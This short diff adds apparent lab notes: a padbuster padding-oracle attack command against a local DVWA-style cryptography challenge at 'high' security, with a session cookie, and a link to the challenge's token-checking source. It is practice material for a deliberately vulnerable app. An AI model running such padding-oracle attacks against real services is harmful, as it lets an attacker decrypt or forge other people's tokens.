@@ -1,0 +1,4 @@
+padbuster http://localhost:4280/vulnerabilities/cryptography/ "token":"","iv":"MTIzNDU2NzgxMjM0NTY3OA==" 16 -cookies "PHPSESSID=3ff41bef4effd759a59f593a4c97dacf; security=high" -encoding 0
+
+
+http://localhost:4280/vulnerabilities/cryptography/source/check_token_high.php
